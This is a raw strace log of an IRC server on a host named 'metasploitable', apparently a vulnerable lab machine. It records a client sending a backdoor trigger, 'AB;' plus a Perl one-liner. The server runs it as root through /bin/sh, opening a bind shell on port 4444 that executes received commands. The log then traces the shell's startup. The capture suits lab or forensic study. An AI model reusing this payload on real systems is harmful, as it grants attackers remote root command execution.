4519  07:39:44.829840 select(1024, [2 3 4 7 9], [], NULL, {0, 920000}) = 1 (in [2], left {0, 720000})
4519  07:39:45.022590 clock_gettime(CLOCK_MONOTONIC, {2794, 839638025}) = 0
4519  07:39:45.022638 time(NULL)        = 1495625985
4519  07:39:45.022649 time(NULL)        = 1495625985
4519  07:39:45.022676 gettimeofday({1495625985, 22679}, NULL) = 0
4519  07:39:45.022687 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:39:45.022727 clock_gettime(CLOCK_MONOTONIC, {2794, 839739877}) = 0
4519  07:39:45.022737 gettimeofday({1495625985, 22741}, NULL) = 0
4519  07:39:45.022748 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:39:45.022787 clock_gettime(CLOCK_MONOTONIC, {2794, 839799553}) = 0
4519  07:39:45.022798 accept(2, 0, NULL) = 5
4519  07:39:45.022818 getpeername(5, {sa_family=AF_INET, sin_port=htons(35505), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:39:45.022849 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:39:45.022861 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:39:45.022874 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:39:45.022886 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:39:45.022898 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:39:45.022909 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:39:45.022923 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:39:45.022941 clock_gettime(CLOCK_MONOTONIC, {2794, 839953998}) = 0
4519  07:39:45.022953 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:39:45.023015 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:39:45.023026 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:39:45.023035 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:39:45.023046 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:39:45.023119 send(6, "P+\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:39:45.023206 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:39:45.023243 gettimeofday({1495625985, 23247}, NULL) = 0
4519  07:39:45.023254 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:39:45.026164 clock_gettime(CLOCK_MONOTONIC, {2794, 843181301}) = 0
4519  07:39:45.026181 recvfrom(6, "P+\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\273\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:39:45.026221 close(6)          = 0
4519  07:39:45.026236 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:39:45.026250 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:39:45.026314 time(NULL)        = 1495625985
4519  07:39:45.026326 time(NULL)        = 1495625985
4519  07:39:45.026338 gettimeofday({1495625985, 26341}, NULL) = 0
4519  07:39:45.026349 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:39:45.026377 clock_gettime(CLOCK_MONOTONIC, {2794, 843390436}) = 0
4519  07:39:45.026388 gettimeofday({1495625985, 26391}, NULL) = 0
4519  07:39:45.026398 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 910000})
4519  07:39:45.110413 clock_gettime(CLOCK_MONOTONIC, {2794, 927422451}) = 0
4519  07:39:45.110414 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:39:45.110414 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110414 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110414 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110414 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110415 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110415 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110415 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110430 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110443 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110457 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110470 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110484 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110497 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110511 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110524 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110537 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110551 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110564 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110578 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110592 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110605 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110633 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 530000}, ...}) = 0
4519  07:39:45.110650 gettimeofday({1495625985, 110654}, NULL) = 0
4519  07:39:45.110662 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:39:45.110703 clock_gettime(CLOCK_MONOTONIC, {2794, 927715687}) = 0
4519  07:39:45.110714 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:39:45.110744 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:39:45.110764 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:39:45.110776 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:39:45.110791 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 11889
11889 07:39:45.110869 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
11889 07:39:45.110884 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
11889 07:39:45.110894 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
11889 07:39:45.110908 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
11889 07:39:45.111014 brk(0)            = 0x80f9000
11889 07:39:45.111036 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.111054 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe0000
11889 07:39:45.111070 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.111087 open("/etc/ld.so.cache", O_RDONLY) = 1
11889 07:39:45.111100 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11889 07:39:45.111133 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd8000
11889 07:39:45.111145 close(1)          = 0
11889 07:39:45.111156 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.111172 open("/lib/libncurses.so.5", O_RDONLY) = 1
11889 07:39:45.111185 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
11889 07:39:45.111285 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
11889 07:39:45.111302 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa8000
11889 07:39:45.111315 mmap2(0xb7fd5000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7fd5000
11889 07:39:45.111332 close(1)          = 0
11889 07:39:45.111344 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.111358 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
11889 07:39:45.111372 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
11889 07:39:45.111462 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
11889 07:39:45.111479 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7fa4000
11889 07:39:45.111490 mmap2(0xb7fa6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7fa6000
11889 07:39:45.111506 close(1)          = 0
11889 07:39:45.111517 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.111530 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
11889 07:39:45.111544 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
11889 07:39:45.111645 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
11889 07:39:45.111662 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa3000
11889 07:39:45.111676 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e54000
11889 07:39:45.111688 mmap2(0xb7f9d000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f9d000
11889 07:39:45.111702 mmap2(0xb7fa0000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fa0000
11889 07:39:45.111716 close(1)          = 0
11889 07:39:45.111739 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e53000
11889 07:39:45.111750 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e536b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
11889 07:39:45.111806 mprotect(0xb7f9d000, 4096, PROT_READ) = 0
11889 07:39:45.111843 munmap(0xb7fd8000, 29913) = 0
11889 07:39:45.111869 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.111883 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
11889 07:39:45.111903 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfffd1c0) = -1 ENOTTY (Inappropriate ioctl for device)
11889 07:39:45.111933 brk(0)            = 0x80f9000
11889 07:39:45.111943 brk(0x80fa000)    = 0x80fa000
11889 07:39:45.111954 brk(0x80fb000)    = 0x80fb000
11889 07:39:45.111970 getuid32()        = 0
11889 07:39:45.111980 getgid32()        = 0
11889 07:39:45.111989 geteuid32()       = 0
11889 07:39:45.111998 getegid32()       = 0
11889 07:39:45.112011 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.112025 time(NULL)        = 1495625985
11889 07:39:45.112038 brk(0x80fc000)    = 0x80fc000
11889 07:39:45.112053 brk(0x80fd000)    = 0x80fd000
11889 07:39:45.112072 open("/proc/meminfo", O_RDONLY) = 1
11889 07:39:45.112102 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
11889 07:39:45.112158 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdf000
11889 07:39:45.112170 read(1, "MemTotal:      1035240 kB\nMemFree:        346456 kB\nBuffers:         85292 kB\nCached:         442780 kB\nSwapCached:          0 kB\nActive:         257584 kB\nInactive:       399416 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        346216 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5228 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52008 kB\nSlab:            20500 kB\nSReclaimable:    11740 kB\nSUnreclaim:       8760 kB\nPageTables:       1976 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
11889 07:39:45.112255 close(1)          = 0
11889 07:39:45.112266 munmap(0xb7fdf000, 4096) = 0
11889 07:39:45.112278 brk(0x80fe000)    = 0x80fe000
11889 07:39:45.112304 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11889 07:39:45.112318 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
11889 07:39:45.112330 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11889 07:39:45.112342 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
11889 07:39:45.112353 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
11889 07:39:45.112365 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
11889 07:39:45.112379 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
11889 07:39:45.112391 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
11889 07:39:45.112404 uname({sys="Linux", node="metasploitable", ...}) = 0
11889 07:39:45.112455 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
11889 07:39:45.112473 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11889 07:39:45.112491 brk(0x8100000)    = 0x8100000
11889 07:39:45.112503 getcwd("/etc/unreal", 4096) = 12
11889 07:39:45.112517 getpid()          = 11889
11889 07:39:45.112533 getppid()         = 4519
11889 07:39:45.112549 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
11889 07:39:45.112569 stat64("/sbin/sh", 0xbfffd198) = -1 ENOENT (No such file or directory)
11889 07:39:45.112581 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11889 07:39:45.112648 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
11889 07:39:45.112688 socket(PF_FILE, SOCK_STREAM, 0) = 1
11889 07:39:45.112701 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11889 07:39:45.112713 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11889 07:39:45.112735 close(1)          = 0
11889 07:39:45.112746 socket(PF_FILE, SOCK_STREAM, 0) = 1
11889 07:39:45.112756 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
11889 07:39:45.112766 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
11889 07:39:45.112784 close(1)          = 0
11889 07:39:45.112798 open("/etc/nsswitch.conf", O_RDONLY) = 1
11889 07:39:45.112812 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
11889 07:39:45.112829 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdf000
11889 07:39:45.112840 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
11889 07:39:45.112889 read(1, "", 4096) = 0
11889 07:39:45.112899 close(1)          = 0
11889 07:39:45.112908 munmap(0xb7fdf000, 4096) = 0
11889 07:39:45.112924 open("/etc/ld.so.cache", O_RDONLY) = 1
11889 07:39:45.112936 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
11889 07:39:45.112952 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7fd8000
11889 07:39:45.112963 close(1)          = 0
11889 07:39:45.112973 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.112988 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
11889 07:39:45.113002 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
11889 07:39:45.113091 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
11889 07:39:45.113152 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e4a000
11889 07:39:45.113164 mmap2(0xb7e51000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7e51000
11889 07:39:45.113185 close(1)          = 0
11889 07:39:45.113198 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
11889 07:39:45.113211 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
11889 07:39:45.113239 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
11889 07:39:45.113327 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
